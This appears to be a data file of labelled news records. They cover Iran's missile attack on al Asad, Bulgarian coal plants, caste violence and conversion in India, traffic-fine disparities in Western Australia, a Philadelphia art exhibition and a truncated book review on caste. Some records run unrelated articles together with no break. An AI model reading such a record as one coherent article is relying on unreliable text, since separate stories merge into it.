0,"Iranian officials said missiles were launched at U.S. troops in Iraq in retaliation after Iranian Gen. Qassem Suleimani’s death in Baghdad, according to Iranian state-run media outlets, in an attack that was later confirmed by the Pentagon. A Pentagon spokesperson later confirmed missiles were fired at two or more Iraqi bases with American and coalition forces. “It is clear that these missiles were launched from Iran and targeted at least two Iraqi military bases hosting U.S. military and coalition personnel at Al Asad and Irbil,” Jonathan Hoffman, assistant to the Secretary of Defense for Public Affairs, said in a statement. “We are working on initial battle damage assessments.” More than a dozen missiles were fired at the base, he added. Iran’s Revolutionary Guards, of which Suleimani was a member, also in a statement via state media: “In Operation Martyr Suleimani in early hours of Wednesday, tens of ground-to-ground missiles were fired at the U.S. base and successfully pounded the al Asad base.” The al Asad base is in Iraq’s Anbar province, which hosts some American troops. The statement continued, “The brave soldiers of IRGC’s aerospace unit have launched a successful attack with tens of ballistic missiles on Al Assad military base in the name of martyr Gen. Qasem Soleimani. … We warn all allied countries of the U.S. that if attacks are launched from bases in their countries on Iran, they will be a target of military retaliation.” White House Press Secretary Stephanie Grisham’s office said in a statement on Twitter the Trump administration is “aware of the reports of attacks on U.S. facilities in Iraq. The President has been briefed and is monitoring the situation closely and consulting with his national security team.” She didn’t say whether the United States has confirmed whether Iran was behind the attacks. During a meeting with key House Democrats on Tuesday night, House Speaker Nancy Pelosi (D-Calif.) learned about the attack, according to CNN. Rep. Dan Kildee (D-Mich.) said she paused the discussion to tell other lawmakers of the news, he told the website. It’s also not clear if there were any casualties. Several days ago, the U.S. military said a report about the al Asad base in Iraq being attacked isn’t true. A U.S. Central Command spokesman told The Epoch Times on Jan. 3: “That report is false.” The al Asad air base is in Iraq’s western Anbar province. It was first used by American forces after the 2003 U.S.-led invasion that toppled dictator Saddam Hussein. It later saw American troops stationed there amid the fight against the ISIS terror group in Iraq and Syria. Hossein Salami, Soleimani’s successor as leader of the Revolutionary Guard, addressed a crowd of supporters gathered at Soleimani’s coffin in a central square in Kerman. He vowed to avenge Soleimani, who was killed in a U.S. drone strike Friday near Baghdad’s airport. “We tell our enemies that we will retaliate but if they take another action we will set ablaze the places that they like and are passionate about,” Salami said. The United States said Soleimani was responsible for killing U.S. troops in Iraq and accused him of plotting new attacks just before he was killed. Soleimani also led forces supporting Syrian President Bashar Assad in that country’s civil war, and he also served as the point man for Iranian proxies in countries like Iraq, Lebanon, and Yemen. Russian President Vladimir Putin met with Assad in Syria on Tuesday amid the tensions between Washington and Tehran. The Associated Press contributed to this report."
0,"HOT: » Greek Ambassador: Bulgaria is our Most Important Economic and Trade partner in the Region #AmbassadorTalks  Future without carbon emissions - this is the goal of the European Commission for the start of the next decade supported in principle by the majority of European citizens for whom it is important to contribute for protecting the environment. The Green Deal proposed by the European Commission to the national governments aims to ensure clean future by 2050. We still don’t know what the price would be but one thing is clear that it will be higher than we can imagine. In Bulgaria, the Green Deal provoked strong opposition, as its eventual adoption would mean the closing down of coal-fired power plants in the country, which is expected to have a huge negative impact on the economy. Currently, coal-fired power plants in the Maritsa basin alone provide 40% of Bulgaria’s electricity. During the winter months, this number increases to 60%. These are base capacities, and are practically the ‘backbone’ of the Bulgarian energy, and because of their maneuverability and technical characteristics they are most suitable for maintaining the load and balance of our electricity system. Even the most ardent opponents of coal-fired power generation recognize that thermal power plants are of the utmost importance and there is no alternative, at least so far, for the stability of the energy system. All this has prompted the government to announce that it will fight for the maximum extension of the work of the Bulgarian coal-fired power plants. The energy heart of the countryA few hundred kilometers away from the political debate epicenter, the Green Deal is perceived from a completely different angle in Stara Zagora. For the people of the region, coal-fired power plants are their daily life, they are a symbol of prosperity and potential for future development. Tens of thousands connect their families’ livelihoods and well-being to the TPPs and their sustainable operation. ContourGlobal Maritsa East 3 TPP is managed by a foreign investor. It has been modernized and meets the highest EU environmental requirements. Working there is a great career opportunity for hundreds of young engineers from the region. The mark it leaves in the daily life of the people in the town of Galabovo and the surrounding settlements is visible.ContourGlobal Maritsa East 3 TPPIn 2011, the modernized Maritsa East 3 TPP is acquired by the international investor ContourGlobal from the Italian Enel. As a result of the large-scale project for rehabilitation and modernization, the power plant becomes the first TPP in Southeastern Europe to meet the highest environmental requirements and meets 10% of the electricity needs of Bulgaria. Since then, ContourGlobal Maritsa East 3 TPP has surpassed its primary role and has become a professional “haven” for generations of Bulgarians.The past comes to lifeLast year Gennadi Zhambov, External Installations Unit operator at ContourGlobal Maritsa East 3 TPP lead through the power plant’s front gate his father Raicho to show him the changes that occurred at this place of work in a few decades after his retirement. Gennadi admits that his father was extremely excited about what he saw; the big difference between today’s modern TPP and the one he remembers from the black and white photos. This reunion is a friendly smile of destiny to a family that has connected its life path with electricity for half a century. It all started back in the 70sMaritsa East 3 TPPs is put in operation in 1978 with only one energy unit. The construction of the present-day power plant had begun 10 years earlier. This is also the time of the first connection of the Gennadi Zhambov’s family with the coal-fired power plant. My grandmother and grandfather were part of the construction of the complex, and for three generations now my family has been connected to the power plant, he says. Gennadi’s father - Raicho Zhambov, starts work at the power plant immediately after its inauguration. The year is 1976. My father worked at the substation of the power plant. An interesting fact, he started work at the power plant two years before the first director of the TPP was appointed. In those days the practice was to hire the workers first so that the complex can function and only after that appoint the director. Gennadi’s first memories of the plant date since then: Daddy took me to the substation where he worked many times and showed me the grids. I asked him what the wires were for, and he explained to me. I must have been 1st grade at the time, Gennadi recalls with a smile. In the coming years, his mother, Zhelyazka, starts work at the power plant as does his uncle. She is assigned to the Coal Supply department. There is almost no relative of his who is not connected somehow with the operation of the TPP. The choice of the youngest member of the family seems predetermined - in 1991 Gennadi enters the power plant. And so, the Dzhambov family has been part of the power plant for more than three decades. Gennadi is an operator of external facilities and is responsible for the generator, transformer and electrical parts.We energy workers are like the military. Discipline is key for our line of work. This is not just a company that generates power; this is a capacity of significance for our national security. Working at the power plant, we do it with the clear awareness that we work for the well-being of the state and Bulgarian citizens. Frankly, I don’t see how the electricity system will exist without us and without the Maritsa East complex at all, Gennadi shares his opinion. In recent years, the power plant itself has undergone significant technological transformation. More than BGN 1 billion has been invested in the modernization of the existing facilities and the construction of new FGDs, which purify over 96% of the Sulphur dioxide released during the lignite coal combustion process. The new image of the TPP also imposes very high workplace safety standards. It took us some time to adapt, but now everything is all right. Our profession faces many challenges on a daily basis - seriousness of work requires perfectionism in terms of safety measures. We follow strict security protocols; it is our responsibility to prevent accidents and to date we are doing great. There is a very serious employers safety policy in force. On the other hand, we also have a serious commitment to the new recruits. They are the future of energy and we have a responsibility to train them well. They learn at different speeds, but they are all motivated and with a positive attitude, says Dzhambov. Many of the employees at ContourGlobal Maritsa East 3 TPP can share similar family stories to those of Gennadi - they have parents who were part of the power plant or continue to work at the plant. Very often sons work together with their fathers on the same shift, and fathers train their sons. Nearly 500 people work at the power plant, and power generation is a profession of regional importance. When Gennadi took his father to the power plant, Grandpa Raicho was accompanied by his granddaughter, Ralitsa, Gennadi’s 8-year-old daughter. The proud dad and grandfather don’t know what the future holds for her, but hardly anyone would be surprised if she chooses to continue the family tradition. The most important thing at present is the sense of fulfilling a mission - to generate and supply electricity. And this is something that the energy worker families at the power plant have mastered perfectly. We need your support so Novinite.com can keep delivering news and information about Bulgaria!

The International Triathlon Union (ITU) has moved the 2020 Chengdu ITU Mixed Relay Olympic Qualification Event to the city of Valencia (Spain). You can find a list of other international sporting events cancelled due to the Coronavirus here. The Chengdu Mixed Relay Olympic Qualification was scheduled for May 9, with the world cup race slotted for the next day. Both events were at the tail end of the Olympic qualifying period and would have been important for athletes trying to make a last go at Olympic qualification. The Mixed Relay event will now be moved to Valencia, Spain on May 1 – it will be the “the last opportunity for three National Olympic Committees to secure two women and two men quota for the Tokyo Olympic Games,” according to a release from the ITU. “The 2020 Chengdu World Cup will be postponed until later in the season and unfortunately, due to the lack of available time in this year’s busy schedule with World Cup racing almost every weekend from March through to May, and despite every effort to find a workable solution, it will not be replaced with another World Cup within the Olympic Qualification period,” according to the release. With a number of Olympic qualifying events being postponed, the ITU says it will increase the size of some of the start fields at other events “over 65 in case it is seen necessary and technically possible.” That won’t happen at any WTS events, though. “The Asian Cup events in Tainan (TPE), Beihai (CHN) and Dexing (CHN) scheduled to be hosted in March and April have been postponed as well, with the full support of the Asian Triathlon Confederation,” according to the ITU. In addition to the Mixed Relay Qualification event, Valencia will also host a World Cup race on the weekend of May 1 to 3.

0,"No Result Found.  Amroha police have clarified that there is no caste angle in this case. The victim was murdered for a dispute over the monetary matter.  Earlier this week it was reported that a 17-year-old boy was shot dead in an Uttar Pradesh's Amroha on June 6 by four youth allegedly because he prayed at a local temple defying upper-caste objections. The incident occurred in the Domkheda village when the accused, Horam Chouhan visited Vikas Jatav's house at night and shot him dead while he was sleeping. This incident was reported extensively by media organizations including India Today, Hindustan Times, and The Telegraph. with a similar headline suggesting ""Dalit teen shot after the temple visit.""  Following the reports, social media was abuzz with similar claims. Co-founder of Alt News, Mohammed Zubair tweeted quoting a tweet by another verified user, ""There is no outrage by News Channels and Anchors because the accused are not from the Minority community.""  As per The Telegraph's report, on June 1, Vikas had visited a Shiv temple at their village of Domkhera in Amroha district, 400km northwest of Lucknow. India Today quoted the victim's father Om Prakash Jatav as saying, ""On March 31, some youth from the Chouhan community prevented my son from entering the temple. We don't know why they did this. We have never been discriminated like this before. They later beat up my son and used casteist slurs but he was saved by some locals."" The Quint quoted the brother of the deceased saying, ""Around 12.30 am in the night, my brother was sleeping on the front porch of our house when four youths stormed inside. One of them shot him dead with a revolver and ran away.” As per reports, the police had been informed of the fight between Jatav and the upper caste youth but no action was taken. Om Prakash said this was not the first time that a Dalit had prayed at the village temple. According to reports, the case has been against the accused under charges of murder and violation of the SC/ST Prevention of Atrocities Act. Vipin Tada, Amroha superintendent of police said, “We have registered a case against four people from a family on the basis of the father’s complaint and are investigating.” Niraj Kumar, an officer in charge of the local police station, said the primary investigation didn’t suggest any dispute relating to a temple or untouchability. He said, “There is no caste angle in the incident. There is video evidence that Dalits have been using the two temples in the village for decades. There was some personal dispute between Vikas and Horam over some money that the victim’s family owed them."" A similar clarification was put out by Amroha Police on Twitter. In the video message, Amroha superintendent of Police, Vipin Tada said, ""A case has been registered and two of the accused have also been arrested. The elder brother of the deceased owed Rs 5000 to the accused, due to which a brawl erupted on May 31. The accused fled from the village that day and returned only on June 6 to take revenge.""  You can watch the video statement here.  However, the Quint reported that the victim’s family has denied any dispute over monetary matter and accused the police of trying to subdue the incident. On asking if there is no caste angle in the incident then why the case is registered under violation of the SC/ST Prevention of Atrocities Act, an Amroha Police official told on the condition of anonymity, that 'cases in which the complainant is from SCST category, the charges under this acts are mostly applied.'

0,"Exclusive: Indigenous people are fined more than average by police officers but less than average by traffic cameras Senior police in Western Australia were warned 12 months ago of a “clearly disturbing” trend of Aboriginal drivers being overrepresented in police-initiated traffic stops, which led to a “notable ethnic disparity” in the issuing of fines. The briefing note from the mothballed evidence-based policing unit, obtained under freedom of information laws by Guardian Australia, found that Aboriginal drivers received 3.2 times more fines from being pulled over by police than non-Aboriginal drivers. But when tickets were issued by traffic cameras, Aboriginal drivers received slightly fewer penalties on average than non-Aboriginal drivers. This article includes content provided by Scribd. We ask for your permission before anything is loaded, as they may be using cookies and other technologies. To view this content, click 'Allow and continue'. The five-year analysis included 69% of all drivers in WA, and showed a “notable ethnic disparity” in the issuing of traffic fines. However, police said they had not acted on the report because decisions on what actions would be taken to reduce Aboriginal incarceration were a matter for cabinet. On average, the report found, Aboriginal drivers in WA receive 1.75 times more penalty units over their lifetime of driving than non-Aboriginal drivers. That is about $1,260 more in fines for Aboriginal drivers, “almost entirely driven by police-initiated, on-the-spot infringements”. It also found Aboriginal drivers were carrying 6.2 times more unpaid fines — amounting to a debt of $2,327. Until last year, police in Western Australia had the power to arrest and jail people for unpaid court fines – and accumulated traffic offences can often end up in court. Drivers with unpaid fines cannot renew their licence, and repeatedly driving unlicensed can result in jail time. “These differences are large enough to suggest an uncomfortable distinction between automated camera and police-initiated traffic enforcement, with this distinction heavily correlated with Aboriginality,” the report by WA Police’s then director of criminology, Dr Geoffrey Barnes, said. The final report was dated 13 February 2019, and recommended further investigation of the “clearly disturbing” trend, concluding: “These findings are consistent with a notable ethnic disparity in police-initiated traffic enforcement, but by no means provide conclusive evidence that deliberate bias exists.” Barnes, who joined WA Police as its first in-house criminologist in May 2017, said the research was unique because traffic cameras provided a control group. “We know that automated traffic enforcement doesn’t detect the difference between the two ethnic groups,” he told Guardian Australia. “Therefore, if we’re only finding it in stops, well that that is an indication that there’s a discretionary element going on … Even if it’s not racism, we don’t want this pattern to exist.” Barnes said the evidence-based policing unit began to lose resources in December 2018, when the deputy commissioner Stephen Brown, who established the unit, left the force. By the time Barnes left WA Police, on 16 January this year, he said he was effectively the only one left. The only person who tried to get traction on his reports was his boss, the assistant commissioner Craig Ward. Ward commissioned the report and presented it to a working group on Aboriginal wellbeing, set up to report to cabinet on the McGowan government’s pledge to reduce the number of Aboriginal people in custody. He told Guardian Australia that the decision to respond to the report would be a matter for cabinet and that WA police no longer had the staff to do the follow-up research that Barnes recommend. “That’s not with any intention to cover it up,” Ward said. “I think it’s frankly a fantastic report and asks us the kind of questions we need to face ... [but] it was about trying to get the best outcome and the best audience at government level to receive this so we could have a whole-of-government outcome.” Dennis Eggington, the chief executive of the Aboriginal Legal Service of Western Australia (ALSWA), said the report, shown to him by Guardian Australia, contained “no surprises, no shocks,” but he was disappointed it had not been acted on. “It just confirms what we as Aboriginal people know and are subjected to,” he said. “I certainly now will be taking the issue up with our police commissioner here in WA to see whether or not we can all work together with the information there to help make things better.” Police in Australia have the power to stop any driver, at any time, to conduct a random breath test, even if they can’t see any offences occurring. It’s a discretionary power, and one Eggington said every Aboriginal person he knows has experienced. “It happens all the time,” he said. “It happens personally to me, it’s happened personally to all my family members.” Eggington said WA police had problems with racism, both systemic and personal, but that the relationship between ALSWA and police had improved. “All colonial institutions have a problem with systemic racism,” he said. Ward said the overrepresentation of Aboriginal people in police-led infringements could be due to a lack of traffic cameras in regional areas, meaning most infringements were issued directly by police. He also said that when police pulled someone over they could issue fines for more than one thing. “[If] it’s a three-car family from the western suburbs, and you’re driving along in your Land Cruiser and you’re the only person in the car speeding because you can and that’s your car, it stops there,” Ward said. “If you’re driving from [the remote Pilbara community of] Jigalong to Newman and you have pulled over and there’s 10 people in the car, and it’s unroadworthy, and you haven’t got a licence and the car’s not registered, that’s a different outcome.” Barnes said a number of sworn police officers described similar scenarios in which extra demerit points might be accumulated by Aboriginal drivers. “Believe me I heard all kinds of assumptive arguments when I wrote this,” he said. “But in the end we have this aggregate trend.” Aboriginal drivers in regional areas received 4.2 times more penalty units from police stops than non-Indigenous drivers, and 41% of all traffic infringements to Aboriginal drivers were issued in regional areas, the report found. The biggest disparity was in the issuing of infringements for not wearing a seatbelt, where Aboriginal drivers received 19.2 times the number of fines. Asked whether the report showed evidence of structural racism in WA police, Ward said that was “certainly something that I thought initially”. But he said he then concluded the disparity was due to government policies for police to target certain types of offences. “Police officers will pretty much follow instructions,” he said. WA police has, in recent years, made efforts to repair its relationship with Aboriginal and Torres Strait Islander peoples, starting with an apology from the commissioner, Chris Dawson, for “past wrongful actions”, issuing Aboriginal service medals to police officers and staff, and a focus on recruiting Aboriginal cadets. Ward said WA police had an “internal communication journey to go on to make sure everyone is on board” with that agenda. “What we do not want to do, as I said, is make a kneejerk response to this, walk around accusing people of unconscious bias or whatever it may be that may set our agenda backwards,” he said."
0," Society October 24, 2020 / By Aman Kanojiya and Richa Nigam / New Delhi Members of Valmiki community converted to Buddhism in presence of Rajratna Ambedkar on October 14 (MIG Photos/Aman Kanojiya) “Just within a week of our conversion to Buddhism, suddenly the local MLA, police and even municipal bodies have rushed to listen to our problems. We have seen authorities suddenly providing us with electricity connections, ration cards and other amenities. We have also been promised proper sanitation facilities and a community hall in our village, especially for the Valmikis here. Though our central demand remains justice for the Hathras rape victim, a 19-year-old dalit girl, we feel that this is the power of a protest done well,” says Aman Chachar, resident of the Karhera village, about 50 km east of New Delhi, in Uttar Pradesh. Karhera village has been in national headlines over the past few days as 236 dalits, belonging to the Valmiki community, converted to Buddhism in presence of Rajratna Ambedkar, president of the Buddhist Society of India and great-grandnephew of B R Ambedkar. The mass conversion took place in protest against the Hathras gangrape and murder. Chachar was one of the converts. Retired politicians and many other eminent personalities visited the Valmiki colony and shared experiences of discrimination as a Dalit in India (MIG Photos/Aman Kanojiya) Even as the government and administration were busy disbursing facilities to the residents of Karhera, police also registered a first information report (FIR) at Sahibabad police station on Thursday against unidentified people for ‘spreading false rumours about religious conversions’. The case was filed on a complaint lodged by Montu Chandel, a self-proclaimed social worker. “People were given money and were promised houses and other amenities in exchange for conversion. It was forced upon them The villagers have converted only because they were inveigled to do so in a ploy to tarnish the government’s reputation,” Chandel told Media India Group. However, the members of the community deny the allegations and say they converted in presence of members of the Buddhist Society of India and have also been given a certificate. “I was there when the conversion took place. More than 200 people of our community have willingly converted to Buddhism. We have evidence in photographs, videos and eyewitnesses. How can anyone claim that the conversion is a false rumour,” Pawan, another recent convert and resident of Karhera village told Media India Group. Pawan says that the Valmikis will continue their fight till justice is served to the Hathras victim (MIG Photos/Aman Kanojiya) “On the one hand, the local politicians and authorities have asked us why we converted and noted our problems; on the other hand, state government calls it a plot to vitiate the atmosphere and even Ghaziabad district administration denies that any such incident took place at all. These two totally contradict each other,” says 65-year-old Inder Ram Maharaj, another convert. The residents also say that a number of policemen have been deployed in their area who keep a strict watch on every passer-by. Some allege that they have been threatened by the police and are being forced to deny that the conversions even took place. “I was taken to a police post the night after the authorities got to know about our conversion. They made me sit there and asked me to confess on video that no conversions took place at all and it was only a gathering to greet Rajratna Ambedkar. They assured me of no further interrogation if I agreed to do as they said but I refused as I was an eye witness and one of the organisers of the ceremony,” Pawan adds. While the women were busy doing their household chores at doorsteps and children played and ran in the open courtyard, the village elders discussed their problems, current status of affairs and the media reports of alleged false rumours. Retired politicians and many other eminent personalities sat with the members of the community and shared experiences of discrimination as a Dalit in India. “I am proud of the youngsters of this community who led people to a better way of life, the one which is free of any caste discrimination. Though a few media reports may show us as corrupt and the government may dismiss our issues, we will stand together till justice is served to the Hathras victim and many others who have faced similar atrocities,” says Pawan. Great and endorsing way that people of ghajiabad have opted .no more atrocities will be endured which r caste based as well as. वाल्मीकि समुदाय को बुद्ध धर्म को अपनाने के लिये एक गाँव ही क्यों चुना गया? क्योंकि वहॉ के लोग अगर-मगर करने में सक्षम नहीं ।क्या बुद्ध धर्म अपनाने के बाद छुआ-छूत ख़त्म हो जायेगी? सवर्ण लोग कहने लगेंगे कि अब तुम कुएँ से पानी भर सकते हो, दूल्हा बनकर घोड़ी पर चढ़ सकते हो। क्योंकि अब तुम बौद्ध हो गए हो, भले ही अभी भी तुम uncleaned profession में पहली की तरह लगे हो।जो कुछ इन लोगों ने अपनाया मेरी राय में वह मूल बुद्ध धर्म नहीं बल्कि उसमें से निकला एक अलग सम्प्रदाय है, जिसे नवयाना या Neo-Buddhism कहते हैं, जिसे बाबा साहब नें १९५५ में अपने अनुयायियों के साथ अपनाया था, जिसमें अधिकांश महाराष्ट्र की दलित क़ौम महार जाति के लोग थे। आज भी इस नये बुद्ध धर्म के लोग ९०% से अधिक महाराष्ट्र में ही हैं।मूल बुद्ध धर्म से अलग नये बुद्ध धर्म अपनाने का कारण लोगों को हिंदू धर्म की आस्था व नमन से अलग करना, जबकि मूल बुद्ध धर्म में इसका समावेश है, क्योंकि बुद्ध धर्म हिंदू धर्म से ही निकला है।हिंदू धर्म इंसान को स्वत: प्राकृतिक तौर पर मिलता है, इसके लिए और धर्मों की तरह दीक्षा, पैगम्बर, या प्रमाण पत्र की ज़रूरत नहीं, इसलिए सब धर्मों में श्रेष्ठ है।दलितों की प्रगति का धर्म परिवर्तन रास्ता नहीं।बाबा साहब के बताये “ शिक्षित बनो” रास्ते पर चल कर ही प्रगति की जा सकती है। छुआ-छूत व भेदभाव निवारण का यही एक मात्र विकल्प है। Bodhi dharm ko apnanay say faltu Kay Hindu karma kand say chutkara mil Jayta h.

Working together to protect journalists worldwide 'Awakened in You,' an exhibit at the Pennsylvania Academy of Fine Arts, celebrates the gift of Dr. Constance E. Clayton, a collector of African American art and former superintendent of Philadelphia public schools. (Emma Lee/WHYY) After receiving a substantial gift of African American art last year, the Pennsylvania Academy of the Fine Arts is now exhibiting 76 paintings and sculptures that came from the personal collection of the former Philadelphia School District superintendent, Dr. Constance Clayton. Clayton was the first African American woman to be Philadelphia’s school superintendent, holding that position from 1982 – 1993. Toward the end of her tenure, she began collecting art with her mother, Williabell Clayton. The mother and daughter duo wanted to acquire work specifically by African American artists, combing galleries and antique stores with an eye for things that would look good in their shared Mt. Airy home. She also wanted work that told a story or conveyed a message about African American life. “If I’m going to live with it, I want to like it,” Clayton said. “I don’t want to buy it because it has someone’s name on it.” Clayton continued to collect art after her mother died in 2004, amassing about 300 pieces, including landscapes, domestic scenes, portraits of Black families and children and abstract works. Dr. Constance E. Clayton is photographed with her mother, Williabell Clayton, in whose honor 78 artworks were donated to the Pennsylvania Academy of Fine Arts. (Courtesy of PAFA) “I love the brilliance of the colors,” Clayton said. The collection includes minor works by major artists: sketches by Henry Ossawa Tanner and Charles White, a rare charcoal by Barkley Hendricks, two 19th century oil landscapes by Edward Bannister. They are all modestly sized. Most of the collection could be squeezed onto the walls of the Clayton home. “As a museum director, it is always the most gratifying thing to hear that a collector collected what they liked,” said Brooke Davis Anderson, director of PAFA’s museum. “We know, in the 21st century, collecting has changed a lot in the contemporary art sector. But collecting art because you want to live with it is, at [its] core, a very admirable approach to art collection building.” When Anderson was invited to visit the Clayton home last year to acquire items for PAFA, she found that they had assembled a serious collection. “I think she and her mom were specifically creating a collection that marched us through the history of African American art,” Anderson said. “Because that’s what this does.” The exhibition, “Awakened In You: the Dr. Constance E. Clayton Collection,” features an entire wall of works by Dox Thrash, the painter and printmaker who benefited from the Works Progress Administration to make work about Black laborers in the Philadelphia shipyards. There is also an etching of Walter Edmund’s young son. Edmunds is known for the murals inside the Church of the Advocate in North Philadelphia. This charcoal and pastel portrait of a boy, an early work by Barkley L. Hendricks, is one of many depictions of African American children and family life in Constance Clayton’s collection. (Emma Lee/WHYY) There are two paintings by Laura Wheeler Waring: a portrait of a young Black student in a pensive pose and a group portrait of four Black children. Waring taught for 30 years at Cheyney University and now has a Philadelphia public elementary school named after her. There is a sparse, abstract print by John Dowell, who taught at Temple University’s Tyler School of Art. The piece doubles as interpretive sheet music (the marks can be read as notations for extended performance techniques, à la John Cage) . There are several small landscapes by Louis Sloan, who taught at PAFA. Not surprising in a collection assembled by an educator, there are lots of teachers represented here. One of Sloan’s students was Barkley Hendricks, who would become well-known for his full-body portraits of African Americans in 1970s hipster clothes. Hendricks died in 2017. His widow, Susan, contributed wall text to this exhibition, in which she compared Sloan’s Philadelphia landscapes to those her late husband painted in Jamaica. “I remember Barkley talking about Lou ‘suiting up’ in his winter protective gear and going out into the harsh elements to paint the winter landscape outside the central Philadelphia environs,” Susan Hendricks wrote. “Sloan was as devoted to the Philadelphia landscape near and around him as Barkley L. Hendricks was to his beloved tropical Jamaica.” PAFA asked 15 people — including Susan Hendricks, Allan Edmunds of the Brandywine Workshop, and Kelly Lee of the Office of Arts, Culture and the Creative Economy — to write explanatory texts for the exhibition. The multiplicity of voices on the walls, some of which point out the connections between the artists, give “Awakened In You” the feel of a community. The artists in the collection taught each other, collaborated with each other and supported one another. “It’s impactful we understand Black artistic networks, that they existed,” said co-curator Sarah Spencer. “They were there to elevate one over the other.” Co-curator Sarah Spencer stands before “The Study of a Student” by Laura Wheeler Waring. (Emma Lee/WHYY) After retiring from the school district in 1993, Clayton became involved with Philadelphia’s cultural sector. In 2000, she became the first chair of Philadelphia Museum of Art’s African American Collections Committee. In that role, she spearheaded a project to highlight PMA’s holdings, which became the 2015 exhibition and catalogue, “Represent: 200 Years of African American Art in the Philadelphia Museum of Art.” In her preface to that catalogue, Clayton credits her mother, who “introduced me to the arts, encouraging me to study piano, lift my voice in song, and, of course, play with paint and clay and paper.” She concluded: “It is my sincere hope that the inspiration I received from my mother’s love will be awakened in you, the children of Philadelphia, and all the visitors to the museum.” The title of this show, ‘Awakened In You,” was pulled out of that preface. Clayton said she chose PAFA to be the recipient of a gift of some of her collection because of its commitment to exhibiting African American art, and the fact that PAFA is also a school. “There’s a teaching aspect to it,” she said. “I thought that was important for children of all races to see, so they can get an understanding of the ability of people who are like them, or of people who are different from them.” Clayton also gifted a significant portion of her collection to the Schomburg Center for Research in Black Culture in New York. But not all of it. Clayton still has art on her walls at home, and still buys when she can. “I’m not cleaning it out. I plan to continue to buy,” she said. “I buy what I like, and what I can afford. I can’t afford Tanner anymore.” From the vaults to the walls at PAFA, women artists are front and center  The exhibition sheds light on the sacrifices and achievements by women artists throughout history to the present day. 22 hours ago Gilbert Lewis remembered as artist, mentor to Philly’s gay ’80s  “Only Tony” features 25 portraits that Gilbert Lewis painted of a single model during the height of the AIDS epidemic. 1 year ago PAFA invites women to take up space in new feminist exhibition  The Pennsylvania Academy of the Fine Arts has reopened in a big way, with big art on big walls that take your breath away with their sheer size. 1 year ago Why did West Chester U. police officers train on social media surveillance?

A+| A| A- Caste Matters by Suraj Yengde, Gurugram: Penguin Random House India, 2019; pp 325, ₹ 599. While you may dismiss Caste Matters by Suraj Yengde as another rant on caste, it sizzles and draws the line with a renewed focus on Brahminism as the ideology that governs India’s public life, the core weaknesses of the Dalit movement, and the kind of radical action caste-embedded marginality calls for. The work builds on the experiences of the author as a Dalit—from an urban fringe in Nanded, Maharashtra to a young academic at Harvard Kennedy School—his encounters with people drawn from diverse backgrounds in several countries, and the kind of reactions that caste invoked in them. Calling attention to the “human degradation” that caste subscribes to, its “violent and toxic ethos,” “deep hatred of the other,” the kind of terror it unleashes on “lesser” and “defamed bodies,” its “brutal chronicles from the past” and the “continuing experiences of humiliation and stigma in the present,” the study intends to set up a public conversation on caste. Critical of the “Dalit hope of a constitutional state,” it seeks to catalyse “a new idiom for transformation.” It challenges the beguiling slogans of development and welfarism and argues that the priority should be “to end and annihilate the echo chamber of oppression” (p 33). He thinks that Dalits have their “Harlem moment” today, in the wake of new technologies of communication and expressions of freedom. A specific methodology informs the text throughout: The author sets aside complex processes of adducing evidence, while backing his observations and judgments through illustrations. It does enable him to reach out to a wider public. Troubles of Dalit Movement The book highlights the continuing dominance of the upper castes, the mote lok, in the Indian body polity, and the persisting marginality and subhuman treatment meted out to Dalits: While the economic system of feudalism has been gradually replaced with a mixed modern-day model of capitalism and state socialism, the social aspect of feudalism is as entrenched as ever. (p 27) The constitutional frame has limited reach to the oppressed, but “many Dalits are repeating the state’s narrative of constitutionalism as being the ultimate virtue” (p 76). In the face of social sanction, law remains a mute witness. The constitutional mask placed on B R Ambedkar lets the state to play identity politics, scuttling Dalit radicalism. Schemes, such as reservation, have led to fights for crumbs. The political regime in place asks Dalits to prove their patriotic credentials, while denouncing their struggles for their rights. Dalits often speak of organisational unity, but are split into umpteen groups beholden to self-serving leaders. There are the “Token Dalits” who consider themselves integral to Hindu culture and sell themselves to the highest bidder. It includes “Conservative Dalits” who diligently practise the caste chores passed on to them as untouchables and “Reactive Dalits” who have no convictions of their own and make their presence felt by reacting to the position of others. There are the “Elite Dalits” consisting of salaried hypocrites, and third generation Dalits. While the salaried Dalits shun fellow Dalits and imitate their non-Dalit peers, the third generation Dalits are “class-sensitive and caste-blind.” The millennials among the latter are technologically savvy and end up “emulating Hindu practices in their households.” There are the “Self-obsessed Dalits” who use the social capital of the community, but having succeeded, use Brahminical language to denigrate their community members. They are harmful as they claim to speak for Dalits. In all, “privileged Dalits effectively execute caste codes upon the lower social, economic and political sub caste Dalit groups” (p 98). There is also a lack of social endosmosis among Dalit castes. It all helps the Brahminical ideology to thrive. Brahminical order weighs heavy on Dalit females as “caste, religion, patriarchy, class and spatiality” overlap in their marginality. The critical sections are the “Radical Dalits,” found in any class or sub-caste of Dalits, who are proud of their caste and Dalitness and are committed to their struggle. They make offences against Dalits public, challenge Brahminical discourse, and reach out to all oppressed persons. The book points out that Dalit intellectuals run an entire spectrum of thinking today: Caste radicals, pragmatic Dalits, Ambedkarites and Marxists. While a spiritual canon is constructed with Ambedkar as the centre, Dalit spiritual life continues to be extremely diverse. Even those who have embraced Buddhism after Ambedkar read it in different ways. There is clearly a process of nationalisation of Dalits to subserve the interests of neo-liberalism in India. The author refers to the much talked about phenomenon of Dalit capitalism patronised by the state and institutionalised in the Dalit Indian Chamber of Commerce and Industry. There is a parallel for the same in the initiative of Booker T Washington who set up capitalist enterprises for Blacks in the United States. The author, however, feels that such an initiative is not compatible with the marginality of Dalits in India, their considered views on the question, and the social nature of capital in India. Dalit capitalism is a new mode of “Baniaising,” inserting Dalits into the existing structures rather than transforming them. The vision of Ambedkar is akin to that of W E B Dubois, who insisted on political power, civil equality and higher education, and did not privilege capitalism. The author also feels that the left has mastered its plan of blaming Western imperial order as the central problem “while remaining blind to the local, everyday caste oppressions” carried out “within the new capitalist market.” Dalits qua Dalits have no agency when they are listed by the left in the struggle against oppression. Brahmins and Brahminism The author thinks that although many atrocities on Dalits might be committed by the Shudras and Kshatriyas, it is the Brahmins who control and regulate the normative order manifested in the “organised power of religion” (p 290). It is the Brahminical order which assigns places and ranks within the social order. Brahmins have absolute control over spirituality—temples, rituals and wealth amassed through “godly guilt.” They enjoy monopoly over soft power, such as the media, and there is little representation there for Dalits or their concerns. Casteism or the ideology they sustain is the “longest-thriving pathology” of conjuring differences between human beings that affects the “mental and social health” of the nation as a whole. A child is reared in emphasising differences and otherness. But, at the same time, “an a-caste, “normal,” and “neutral” identity dominates mainstream discourse—which is actually a thinly-veiled ideal of Brahmin identity that everyone is supposed to aspire to. Inevitably, amidst this narrative, it is the Dalit who is forced to 